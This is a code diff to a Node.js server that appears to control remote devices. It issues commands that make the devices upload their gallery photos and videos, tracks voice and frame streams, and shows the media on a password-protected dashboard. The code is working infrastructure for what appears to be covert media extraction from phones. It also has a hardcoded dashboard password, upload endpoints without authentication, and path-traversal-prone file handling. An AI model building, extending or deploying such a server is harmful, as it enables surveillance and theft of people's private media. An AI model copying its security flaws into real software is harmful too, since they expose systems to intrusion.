@@ -15,8 +15,8 @@ const io = socketIo(server, {
 });
 
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.json({ limit: '250mb' }));
+app.use(express.urlencoded({ extended: true, limit: '250mb' }));
 
 // ========== GALLERY STORAGE ==========
 const GALLERY_DIR = path.join(__dirname, 'gallery');
@@ -63,6 +63,111 @@ function loadGalleryData() {
     return {};
 }
 
+// ========== QUEUE + SERIAL DOWNLOAD ==========
+const IMAGE_QUEUE_LIMIT = 2;  // max images kept on disk per device
+const VIDEO_QUEUE_LIMIT = 2;  // max videos kept on disk per device
+const imageQueue = {};         // deviceId -> [fileName, ...] oldest first
+const videoQueue = {};         // deviceId -> [fileName, ...] oldest first
+
+// Serial download state — only 1 file downloads at a time per device
+const downloadInProgress = {}; // deviceId -> fileName | null
+const downloadPending    = {}; // deviceId -> [fileName, ...]
+
+// 5-minute auto-cleanup timers for files on disk
+const fileTimers = {};         // "deviceId::fileName" -> timeoutId
+const FILE_TTL_MS = 5 * 60 * 1000; // 5 minutes
+
+function scheduleFileCleanup(deviceId, fileName) {
+    const key = `${deviceId}::${fileName}`;
+    if (fileTimers[key]) clearTimeout(fileTimers[key]);
+    fileTimers[key] = setTimeout(() => {
+        delete fileTimers[key];
+        deleteFile(deviceId, fileName);
+        console.log(`⏰ 5-min TTL expired, deleted: ${fileName} (${deviceId})`);
+    }, FILE_TTL_MS);
+}
+
+function deleteFile(deviceId, fileName) {
+    try {
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        const candidates = [
+            path.join(deviceDir, fileName),
+            ...fs.existsSync(deviceDir)
+                ? fs.readdirSync(deviceDir).map(sub => path.join(deviceDir, sub, fileName))
+                : []
+        ];
+        for (const fp of candidates) {
+            if (fs.existsSync(fp)) { fs.unlinkSync(fp); break; }
+        }
+        if (galleryData[deviceId]) {
+            galleryData[deviceId] = galleryData[deviceId].filter(f => f.name !== fileName);
+            saveGalleryData();
+        }
+        // remove from queues
+        if (imageQueue[deviceId]) imageQueue[deviceId] = imageQueue[deviceId].filter(n => n !== fileName);
+        if (videoQueue[deviceId]) videoQueue[deviceId] = videoQueue[deviceId].filter(n => n !== fileName);
+        console.log(`🗑️ Evicted: ${fileName} (${deviceId})`);
+    } catch (e) {
+        console.error(`❌ Delete error (${fileName}):`, e.message);
+    }
+}
+
+function addToQueue(deviceId, fileName, fileType) {
+    const ext = (fileName.split('.').pop() || '').toLowerCase();
+    const isVideo = (fileType || '').toLowerCase().includes('video') ||
+                    ['mp4','3gp','mkv','avi','mov','webm'].includes(ext);
+    if (isVideo) {
+        if (!videoQueue[deviceId]) videoQueue[deviceId] = [];
+        if (!videoQueue[deviceId].includes(fileName)) videoQueue[deviceId].push(fileName);
+        while (videoQueue[deviceId].length > VIDEO_QUEUE_LIMIT) {
+            deleteFile(deviceId, videoQueue[deviceId].shift());
+        }
+    } else {
+        if (!imageQueue[deviceId]) imageQueue[deviceId] = [];
+        if (!imageQueue[deviceId].includes(fileName)) imageQueue[deviceId].push(fileName);
+        while (imageQueue[deviceId].length > IMAGE_QUEUE_LIMIT) {
+            deleteFile(deviceId, imageQueue[deviceId].shift());
+        }
+    }
+}
+
+// Send next pending download command to device
+function sendNextDownload(deviceId) {
+    if (!downloadPending[deviceId] || downloadPending[deviceId].length === 0) {
+        downloadInProgress[deviceId] = null;
+        return;
+    }
+    const next = downloadPending[deviceId].shift();
+    downloadInProgress[deviceId] = next;
+    requestedFiles[`${deviceId}::${next}`] = Date.now();
+    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+    pendingCommands[deviceId].push({ command: 'gallery_file', value: next });
+    console.log(`📤 Serial download → ${next} (${deviceId}) | queue: ${(downloadPending[deviceId]||[]).length} remaining`);
+}
+
+// Shared helper: queue a file download through the serial system (used by all endpoints)
+function requestFileFromDevice(deviceId, fileName) {
+    const reqKey = `${deviceId}::${fileName}`;
+    // Already in-progress or recently sent
+    if (requestedFiles[reqKey] && (Date.now() - requestedFiles[reqKey]) < 5 * 60 * 1000) return 'already';
+    if (!downloadPending[deviceId]) downloadPending[deviceId] = [];
+    if (downloadInProgress[deviceId] === fileName || downloadPending[deviceId].includes(fileName)) return 'queued';
+
+    if (downloadInProgress[deviceId]) {
+        // Another file downloading → wait in line
+        downloadPending[deviceId].push(fileName);
+        console.log(`⏳ Queued: ${fileName} | pos ${downloadPending[deviceId].length} (${deviceId})`);
+        return 'queued';
+    }
+    // Nothing downloading → send immediately
+    downloadInProgress[deviceId] = fileName;
+    requestedFiles[reqKey] = Date.now();
+    if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+    pendingCommands[deviceId].push({ command: 'gallery_file', value: fileName });
+    console.log(`📤 Download started: ${fileName} (${deviceId})`);
+    return 'sent';
+}
+
 // ========== AUTH ==========
 const DASHBOARD_PASSWORD = 'ajaybabu95';
 const SESSION_SECRET = crypto.randomBytes(32).toString('hex');
@@ -90,6 +195,8 @@ let activeStreams = {};
 let frameQueues = {};
 let voiceStreams = {};
 let voiceDataQueue = {};
+// tracks files requested from device — key: `${deviceId}::${fileName}`, value: timestamp
+const requestedFiles = {};
 
 function getDeviceSettings(deviceId) {
     if (!deviceSettings[deviceId]) {
@@ -146,6 +253,33 @@ setInterval(() => {
         return true;
     });
 }, 15000);
+
+// ========== AUTO CLEANUP ==========
+// Every 15 min: delete gallery files older than 48 hours
+const CLEANUP_INTERVAL_MS = 15 * 60 * 1000;
+const MAX_FILE_AGE_MS     = 48 * 60 * 60 * 1000;
+
+setInterval(() => {
+    const now = Date.now();
+    let removed = 0;
+    try {
+        for (const deviceId of Object.keys(galleryData)) {
+            const files = galleryData[deviceId] || [];
+            const toDelete = files.filter(f => (f.date || 0) > 0 && (now - (f.date || 0)) > MAX_FILE_AGE_MS);
+            for (const f of toDelete) {
+                deleteFile(deviceId, f.name);
+                removed++;
+            }
+        }
+        // Clean stale requestedFiles entries older than 10 min
+        for (const key of Object.keys(requestedFiles)) {
+            if ((now - requestedFiles[key]) > 10 * 60 * 1000) delete requestedFiles[key];
+        }
+        if (removed > 0) console.log(`🧹 Auto-cleanup: removed ${removed} file(s) older than 48h`);
+    } catch (e) {
+        console.error('❌ Auto-cleanup error:', e.message);
+    }
+}, CLEANUP_INTERVAL_MS);
 
 // ========== HTTP API ==========
 
@@ -322,19 +456,15 @@ app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             });
         }
 
-        const alreadyPending = (pendingCommands[deviceId] || []).some(c => c.command === 'gallery_file' && c.value === fileName);
-        if (!alreadyPending) {
-            console.log(`📤 Requesting file from device: ${fileName}`);
-            const cmd = { command: 'gallery_file', value: fileName };
-            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-            pendingCommands[deviceId].push(cmd);
-        }
-
-        res.json({
-            success: false,
-            pending: true,
-            message: 'Requesting file from device...'
-        });
+        // File not on disk — force fresh request every time user clicks
+        const reqKey = `${deviceId}::${fileName}`;
+        delete requestedFiles[reqKey];                                            // bypass 5-min cache
+        if (downloadPending[deviceId])                                            // remove from pending so it re-queues fresh
+            downloadPending[deviceId] = downloadPending[deviceId].filter(n => n !== fileName);
+        if (downloadInProgress[deviceId] === fileName)                            // if mid-download, reset so command resends
+            downloadInProgress[deviceId] = null;
+        const status = requestFileFromDevice(deviceId, fileName);
+        res.json({ success: false, pending: true, status, message: 'Requesting file from device...' });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
@@ -377,6 +507,11 @@ app.post('/api/upload/file', (req, res) => {
         }
 
         saveGalleryData();
+        addToQueue(deviceId, file.name, file.type || 'image');
+        delete requestedFiles[`${deviceId}::${file.name}`];
+        scheduleFileCleanup(deviceId, file.name);
+        sendNextDownload(deviceId);
+        io.emit('gallery_update', { deviceId, fileName: file.name, type: file.type || 'image' });
         res.json({
             success: true,
             message: `File saved: ${file.name}`,
@@ -384,6 +519,91 @@ app.post('/api/upload/file', (req, res) => {
         });
     } catch (e) {
         console.error('❌ Upload error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ========== CHUNK UPLOAD API ==========
+app.post('/api/upload/chunk', async (req, res) => {
+    try {
+        const { deviceId, file } = req.body;
+
+        if (!deviceId || !file || !file.name || file.data === undefined || file.chunkIndex === undefined) {
+            return res.status(400).json({ success: false, error: 'Missing chunk data' });
+        }
+
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        const folderDir = path.join(deviceDir, file.folder || 'Root');
+        if (!fs.existsSync(folderDir)) {
+            fs.mkdirSync(folderDir, { recursive: true });
+        }
+
+        // Write this chunk
+        const chunkPath = path.join(folderDir, `${file.name}.part${file.chunkIndex}`);
+        fs.writeFileSync(chunkPath, Buffer.from(file.data, 'base64'));
+
+        const totalChunks = file.totalChunks || 1;
+        console.log(`📦 Chunk ${file.chunkIndex + 1}/${totalChunks}: ${file.name} from ${deviceId}`);
+
+        // Check whether all chunks are present
+        for (let i = 0; i < totalChunks; i++) {
+            if (!fs.existsSync(path.join(folderDir, `${file.name}.part${i}`))) {
+                return res.json({ success: true, merged: false, chunk: file.chunkIndex, total: totalChunks });
+            }
+        }
+
+        // Merge all chunks into final file
+        const finalPath = path.join(folderDir, file.name);
+        await new Promise((resolve, reject) => {
+            const ws = fs.createWriteStream(finalPath);
+            ws.on('finish', resolve);
+            ws.on('error', reject);
+            (function writeNext(i) {
+                if (i >= totalChunks) { ws.end(); return; }
+                const partPath = path.join(folderDir, `${file.name}.part${i}`);
+                const data = fs.readFileSync(partPath);
+                fs.unlinkSync(partPath);
+                ws.write(data, () => writeNext(i + 1));
+            })(0);
+        });
+
+        const finalSize = fs.statSync(finalPath).size;
+        console.log(`✅ Video merged: ${file.name} (${(finalSize / 1024 / 1024).toFixed(1)} MB)`);
+
+        // Register in gallery
+        if (!galleryData[deviceId]) galleryData[deviceId] = [];
+        if (!galleryData[deviceId].find(f => f.name === file.name)) {
+            galleryData[deviceId].push({
+                name: file.name,
+                type: 'video',
+                size: finalSize,
+                date: file.date || Date.now(),
+                path: file.name,
+                folder: file.folder || 'Root'
+            });
+        }
+        saveGalleryData();
+        addToQueue(deviceId, file.name, 'video');
+        delete requestedFiles[`${deviceId}::${file.name}`];
+        scheduleFileCleanup(deviceId, file.name);
+        sendNextDownload(deviceId);
+        io.emit('gallery_update', { deviceId, fileName: file.name, type: 'video' });
+
+        res.json({ success: true, merged: true, name: file.name, size: finalSize });
+    } catch (e) {
+        console.error('❌ Chunk upload error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// Serial file request — 1 download at a time; others wait in queue
+app.post('/api/gallery/request', (req, res) => {
+    try {
+        const { deviceId, fileName } = req.body;
+        if (!deviceId || !fileName) return res.status(400).json({ success: false, error: 'Missing params' });
+        const status = requestFileFromDevice(deviceId, fileName);
+        res.json({ success: true, status });
+    } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
 });
@@ -773,6 +993,65 @@ app.get('/api/settings', (req, res) => res.json({ success: true, settings: { str
 
 app.get('/favicon.ico', (req, res) => res.status(204).end());
 
+// ========== VIDEO STREAM API ==========
+app.get('/api/gallery/video/:deviceId/:fileName', (req, res) => {
+    try {
+        const { deviceId, fileName } = req.params;
+        const folder = req.query.folder || null;
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+
+        let filePath = null;
+        if (folder) {
+            const fp = path.join(deviceDir, folder, fileName);
+            if (fs.existsSync(fp)) filePath = fp;
+        }
+        if (!filePath) {
+            const dp = path.join(deviceDir, fileName);
+            if (fs.existsSync(dp)) filePath = dp;
+        }
+        if (!filePath && fs.existsSync(deviceDir)) {
+            for (const sub of fs.readdirSync(deviceDir)) {
+                const candidate = path.join(deviceDir, sub, fileName);
+                if (fs.existsSync(candidate)) { filePath = candidate; break; }
+            }
+        }
+        if (!filePath) return res.status(404).end();
+
+        const ext = path.extname(fileName).toLowerCase().replace('.', '');
+        const mimeMap = {
+            mp4: 'video/mp4', '3gp': 'video/3gpp', mkv: 'video/x-matroska',
+            webm: 'video/webm', mov: 'video/quicktime', avi: 'video/x-msvideo'
+        };
+        const contentType = mimeMap[ext] || 'video/mp4';
+        const fileSize = fs.statSync(filePath).size;
+        const range = req.headers.range;
+
+        if (range) {
+            const parts = range.replace(/bytes=/, '').split('-');
+            const start = parseInt(parts[0], 10) || 0;
+            const end = parts[1] ? Math.min(parseInt(parts[1], 10), fileSize - 1) : fileSize - 1;
+            const chunkSize = end - start + 1;
+
+            res.status(206);
+            res.setHeader('Content-Range', `bytes ${start}-${end}/${fileSize}`);
+            res.setHeader('Accept-Ranges', 'bytes');
+            res.setHeader('Content-Length', chunkSize);
+            res.setHeader('Content-Type', contentType);
+            res.setHeader('Content-Disposition', 'inline');
+            fs.createReadStream(filePath, { start, end }).pipe(res);
+        } else {
+            res.status(200);
+            res.setHeader('Content-Length', fileSize);
+            res.setHeader('Content-Type', contentType);
+            res.setHeader('Accept-Ranges', 'bytes');
+            res.setHeader('Content-Disposition', 'inline');
+            fs.createReadStream(filePath).pipe(res);
+        }
+    } catch (e) {
+        if (!res.headersSent) res.status(500).end();
+    }
+});
+
 // ========== THUMBNAIL API ==========
 app.get('/api/gallery/thumb/:deviceId/:fileName', async (req, res) => {
     try {
@@ -855,14 +1134,14 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         .folder-card .f-name { font-size:13px; font-weight:600; color:#ddd; word-break:break-word; margin-bottom:4px; }
         .folder-card .f-count { font-size:11px; color:#666; }
         /* File grid */
-        .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; }
-        .gallery-item { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
+        .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(90px,1fr)); gap:5px; }
+        .gallery-item { background:#1a1a1a; border-radius:8px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
         .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
-        .gallery-item .thumb { width:100%; height:150px; display:flex; align-items:center; justify-content:center; font-size:48px; color:#555; background:#111; position:relative; }
-        .gallery-item.video .thumb .play-badge { position:absolute; font-size:28px; }
-        .gallery-item .info { padding:8px 10px; }
-        .gallery-item .info .name { font-size:11px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .gallery-item .info .size { font-size:10px; color:#666; }
+        .gallery-item .thumb { width:100%; height:90px; display:flex; align-items:center; justify-content:center; font-size:32px; color:#555; background:#111; position:relative; }
+        .gallery-item.video .thumb .play-badge { position:absolute; font-size:20px; }
+        .gallery-item .info { padding:4px 6px; }
+        .gallery-item .info .name { font-size:10px; color:#aaa; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .gallery-item .info .size { font-size:9px; color:#555; }
         .loading { text-align:center; color:#666; padding:60px; font-size:15px; }
         .empty { text-align:center; color:#666; padding:60px; }
         .empty .e-icon { font-size:52px; display:block; margin-bottom:12px; }
@@ -880,7 +1159,11 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         .viewer .v-controls button:hover { background:#667eea; border-color:#667eea; }
         .viewer .v-controls button.danger:hover { background:#f44336; border-color:#f44336; }
         .viewer .v-counter { color:#888; font-size:13px; }
-        @media (max-width:500px){ .gallery-grid { grid-template-columns:repeat(auto-fill, minmax(120px,1fr)); } .folder-grid { grid-template-columns:repeat(auto-fill, minmax(130px,1fr)); } }
+        #vidPlayOverlay { display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); cursor:pointer; z-index:10000; flex-direction:column; align-items:center; gap:8px; }
+        #vidPlayOverlay .play-circle { width:80px; height:80px; border-radius:50%; background:rgba(0,0,0,.55); border:3px solid rgba(255,255,255,.7); display:flex; align-items:center; justify-content:center; font-size:38px; color:#fff; transition:all .2s; padding-left:5px; }
+        #vidPlayOverlay:hover .play-circle { background:rgba(102,126,234,.7); border-color:#667eea; }
+        #vidPlayOverlay .play-label { color:rgba(255,255,255,.8); font-size:13px; font-weight:600; }
+        @media (max-width:500px){ .gallery-grid { grid-template-columns:repeat(auto-fill, minmax(75px,1fr)); gap:4px; } .folder-grid { grid-template-columns:repeat(auto-fill, minmax(130px,1fr)); } }
     </style>
 </head>
 <body>
@@ -912,6 +1195,10 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     </div>
     <img id="viewerImg" class="v-media" src="" alt="" style="display:none;">
     <video id="viewerVid" class="v-media" controls style="display:none;"></video>
+    <div id="vidPlayOverlay" onclick="playVideo()">
+        <div class="play-circle">▶</div>
+        <div class="play-label">Play</div>
+    </div>
     <div class="v-info" id="viewerInfo"></div>
     <div class="v-controls">
         <button onclick="prevFile()">◀ Prev</button>
@@ -1045,10 +1332,10 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             html += '<div class="gallery-item ' + (isVideo ? 'video' : '') + '" onclick="openViewer(' + safeIdx + ')">';
             html += '<div class="thumb" style="padding:0;overflow:hidden;position:relative;">';
             if (isVideo) {
-                html += '<img src="' + FALLBACK_VID + '" style="width:100%;height:150px;object-fit:cover;display:block;">';
-                html += '<span class="play-badge" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px;pointer-events:none;">▶</span>';
+                html += '<img src="' + FALLBACK_VID + '" style="width:100%;height:90px;object-fit:cover;display:block;">';
+                html += '<span class="play-badge" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:22px;pointer-events:none;">▶</span>';
             } else {
-                html += '<img data-src="' + thumbUrl + '" src="' + FALLBACK_IMG + '" style="width:100%;height:150px;object-fit:cover;display:block;" class="lazy-thumb">';
+                html += '<img data-src="' + thumbUrl + '" data-filename="' + file.name.replace(/"/g,'&#34;') + '" src="' + FALLBACK_IMG + '" style="width:100%;height:90px;object-fit:cover;display:block;" class="lazy-thumb">';
             }
             html += '</div>';
             html += '<div class="info">';
@@ -1059,33 +1346,46 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         html += '</div>';
         document.getElementById('galleryContent').innerHTML = html;
 
-        // IntersectionObserver lazy loading — sirf visible thumbs load honge
+        // IntersectionObserver lazy loading — visible thumbs load, missing files auto-requested from device
         const lazyImgs = document.querySelectorAll('.lazy-thumb');
+        const _fb = FALLBACK_IMG;
+        let _thumbReqCount = 0;
+        const _MAX_THUMB_REQ = 20; // max auto-requests per folder render
+
+        function _loadThumb(img) {
+            const src = img.getAttribute('data-src');
+            if (!src) return;
+            img.onerror = function() {
+                img.onerror = null;
+                img.src = _fb;
+                // File not on server — request from device automatically
+                if (_thumbReqCount < _MAX_THUMB_REQ) {
+                    const fn = img.getAttribute('data-filename');
+                    if (fn) {
+                        _thumbReqCount++;
+                        fetch('/api/gallery/request', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ deviceId: deviceId, fileName: fn })
+                        }).catch(() => {});
+                    }
+                }
+            };
+            img.src = src;
+            img.removeAttribute('data-src');
+        }
+
         if ('IntersectionObserver' in window) {
             const obs = new IntersectionObserver((entries, observer) => {
                 entries.forEach(entry => {
                     if (!entry.isIntersecting) return;
-                    const img = entry.target;
-                    const src = img.getAttribute('data-src');
-                    if (src) {
-                        img.onerror = () => { img.onerror = null; img.src = FALLBACK_IMG; };
-                        img.src = src;
-                        img.removeAttribute('data-src');
-                    }
-                    observer.unobserve(img);
+                    _loadThumb(entry.target);
+                    observer.unobserve(entry.target);
                 });
-            }, { rootMargin: '150px' });
+            }, { rootMargin: '250px' });
             lazyImgs.forEach(img => obs.observe(img));
         } else {
-            // fallback for old browsers
-            lazyImgs.forEach(img => {
-                const src = img.getAttribute('data-src');
-                if (src) {
-                    img.onerror = () => { img.onerror = null; img.src = FALLBACK_IMG; };
-                    img.src = src;
-                    img.removeAttribute('data-src');
-                }
-            });
+            lazyImgs.forEach(img => _loadThumb(img));
         }
     }
 
@@ -1152,48 +1452,109 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
 
         showViewerLoading('');
 
-        const url = '/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name) +
-                    '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
+        if (isVideo) {
+            const streamUrl = '/api/gallery/video/' + deviceId + '/' + encodeURIComponent(file.name) +
+                              '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
+            viewerDataUrl = streamUrl;
 
-        fetch(url)
-            .then(r => r.json())
-            .then(data => {
-                if (data.success && data.data) {
-                    const mime = getMime(file.name, data.type || file.type);
-                    const dataUrl = 'data:' + mime + ';base64,' + data.data;
-                    viewerDataUrl = dataUrl;
-                    hideViewerLoading();
-                    if (isVideo) {
-                        vidEl.src = dataUrl;
-                        vidEl.style.display = 'block';
-                        vidEl.play().catch(() => {});
-                    } else {
+            vidEl.onerror = null;
+            vidEl.oncanplay = null;
+            document.getElementById('vidPlayOverlay').style.display = 'none';
+
+            // Video ready — show play button
+            vidEl.oncanplay = function() {
+                vidEl.oncanplay = null;
+                hideViewerLoading();
+                document.getElementById('vidPlayOverlay').style.display = 'flex';
+            };
+
+            // Video not on server — send ONE command to device
+            vidEl.onerror = function() {
+                vidEl.onerror = null;
+                vidEl.oncanplay = null;
+                document.getElementById('vidPlayOverlay').style.display = 'none';
+                showViewerLoading('📡 Device se video maang raha hai...');
+                fetch('/api/gallery/request', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId: deviceId, fileName: file.name })
+                }).catch(() => {});
+            };
+
+            showViewerLoading('');
+            vidEl.src = streamUrl;
+            vidEl.load();
+            vidEl.style.display = 'block';
+        } else {
+            const url = '/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name) +
+                        '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
+
+            fetch(url)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.success && data.data) {
+                        const mime = getMime(file.name, data.type || file.type);
+                        const dataUrl = 'data:' + mime + ';base64,' + data.data;
+                        viewerDataUrl = dataUrl;
+                        hideViewerLoading();
                         imgEl.src = dataUrl;
                         imgEl.style.display = 'block';
+                        // File shown — now safe to pre-request next 2 (current is confirmed sent first)
+                        prefetchFiles(index);
+                    } else if (data.pending) {
+                        showViewerLoading('⏳ Device se download ho rahi hai...');
+                        // Current file queued — pre-request next 2 AFTER current is confirmed queued
+                        prefetchFiles(index);
+                        // Retry every 3 s in case socket event is missed
+                        setTimeout(function() {
+                            if (document.getElementById('viewer').classList.contains('active') && currentIndex === index) {
+                                openViewer(index);
+                            }
+                        }, 3000);
+                    } else {
+                        hideViewerLoading();
+                        imgEl.alt = '❌ File not found';
+                        imgEl.style.display = 'block';
                     }
-                } else if (data.pending) {
-                    showViewerLoading('File device se download ho rahi hai...');
-                    setTimeout(() => {
-                        if (document.getElementById('viewer').classList.contains('active') && currentIndex === index) {
-                            openViewer(index);
-                        }
-                    }, 3000);
-                } else {
-                    hideViewerLoading();
-                    imgEl.alt = '❌ File not found';
-                    imgEl.style.display = 'block';
-                }
-            })
-            .catch(() => {
-                showViewerLoading('❌ Network error');
-            });
+                })
+                .catch(() => {
+                    showViewerLoading('❌ Network error');
+                });
+        }
+    }
+
+    // Pre-request next 1 image in background (only when current is also an image)
+    function prefetchFiles(fromIndex) {
+        const currentFile = currentFolderFiles[fromIndex];
+        if (!currentFile || currentFile.type === 'video') return; // video open ho to prefetch nahi
+        for (let i = fromIndex + 1; i < currentFolderFiles.length; i++) {
+            const f = currentFolderFiles[i];
+            if (!f || f.type === 'video') continue; // skip videos, next image lo
+            fetch('/api/gallery/request', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: deviceId, fileName: f.name })
+            }).catch(() => {});
+            break; // sirf 1
+        }
     }
 
     function closeViewer() {
         const vidEl = document.getElementById('viewerVid');
+        vidEl.onerror = null;
+        vidEl.oncanplay = null;
         vidEl.pause();
         vidEl.removeAttribute('src');
+        document.getElementById('vidPlayOverlay').style.display = 'none';
         document.getElementById('viewer').classList.remove('active');
+    }
+
+    function playVideo() {
+        const vidEl = document.getElementById('viewerVid');
+        document.getElementById('vidPlayOverlay').style.display = 'none';
+        vidEl.play().catch(() => {
+            document.getElementById('vidPlayOverlay').style.display = 'flex';
+        });
     }
 
     function prevFile() { if (currentIndex > 0) openViewer(currentIndex - 1); }
@@ -1231,6 +1592,58 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     });
 
     loadGallery();
+
+    // ── Socket.io — thumbnail refresh + video auto-play when file arrives ──
+    let _galReloadTimer = null;
+    const _galSocket = io({ transports: ['websocket', 'polling'] });
+    _galSocket.on('gallery_update', function(data) {
+        if (data.deviceId !== deviceId) return;
+
+        // Directly swap thumbnail for the arrived image — no re-render needed
+        if (data.type !== 'video') {
+            const escapedName = data.fileName.replace(/"/g, '&#34;');
+            const thumbImg = document.querySelector('img[data-filename="' + escapedName + '"]');
+            if (thumbImg) {
+                const fileObj = currentFolderFiles.find(function(f){ return f.name === data.fileName; }) || {};
+                const folder = encodeURIComponent(fileObj.folder || currentFolderName || '');
+                thumbImg.onerror = null;
+                thumbImg.src = '/api/gallery/thumb/' + encodeURIComponent(deviceId) + '/' +
+                               encodeURIComponent(data.fileName) + '?folder=' + folder + '&t=' + Date.now();
+            }
+        }
+
+        // Debounced full reload so rapid uploads don't hammer re-renders
+        clearTimeout(_galReloadTimer);
+        _galReloadTimer = setTimeout(function() { loadGallery(); }, 1000);
+
+        // If viewer is open waiting for this IMAGE → auto-load it now
+        const viewer = document.getElementById('viewer');
+        const file = currentFolderFiles[currentIndex];
+        if (viewer.classList.contains('active') && file && file.name === data.fileName && data.type !== 'video') {
+            openViewer(currentIndex); // re-open same index; file is now on disk
+        }
+
+        // If viewer is open and waiting for exactly this video → auto-play it
+        const vidEl = document.getElementById('viewerVid');
+        if (!viewer.classList.contains('active') || !file) return;
+        if (file.type !== 'video' || file.name !== data.fileName) return;
+        const streamUrl = '/api/gallery/video/' + deviceId + '/' + encodeURIComponent(data.fileName) +
+                          '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
+        vidEl.onerror = null;
+        vidEl.oncanplay = null;
+        document.getElementById('vidPlayOverlay').style.display = 'none';
+        hideViewerLoading();
+        vidEl.oncanplay = function() {
+            vidEl.oncanplay = null;
+            document.getElementById('vidPlayOverlay').style.display = 'none';
+            vidEl.play().catch(() => {
+                document.getElementById('vidPlayOverlay').style.display = 'flex';
+            });
+        };
+        vidEl.src = streamUrl;
+        vidEl.load();
+        vidEl.style.display = 'block';
+    });
 </script>
 </body>
 </html>`);
